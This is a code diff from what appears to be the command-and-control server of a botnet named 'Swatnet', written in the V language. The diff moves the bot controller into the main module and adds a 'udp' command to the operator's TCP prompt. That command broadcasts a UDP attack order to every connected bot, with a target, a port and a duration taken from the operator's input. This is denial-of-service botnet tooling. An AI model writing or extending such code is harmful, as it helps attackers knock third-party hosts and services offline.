@@ -5,7 +5,6 @@ import net
 import time
 import crypto.sha1
 
-import cnc
 import core.crud
 
 pub struct Swatnet {
@@ -15,7 +14,7 @@ pub struct Swatnet {
 		bot_pw		string
 		clients 	Clients
 		user_crud	crud.User
-		bot			cnc.Bot_CNC
+		bot			Bot_CNC
 }
 
 pub struct Clients {
@@ -25,7 +24,7 @@ pub struct Clients {
 }
 
 pub fn start_swatnet() Swatnet {
-	mut s := Swatnet{clients: &Clients{}, user_crud: &crud.User{}, bot: cnc.start_botcnc()}
+	mut s := Swatnet{clients: &Clients{}, user_crud: &crud.User{}, bot: start_botcnc()}
 	return s
 }
 
@@ -82,12 +81,17 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 	for {
 		client.write_string(">>> ") or { 0 }
 		data := reader.read_line() or { "" }
-		if data.len > 5 {
-			match data {
+		fcmd, cmd, args := s.bot.parse_buffer(data)
+		if data.len > 2 {
+			match cmd {
 				"help" {
 					client.write_string("Working\r\n") or { 0 }
+				}
+				"udp" {
+					s.bot.broadcast_cmd("udp ${args[1]} ${args[2]} ${args[3]}")
 				} else {}
 			}
+			println(data)
 		}
 	}
 }
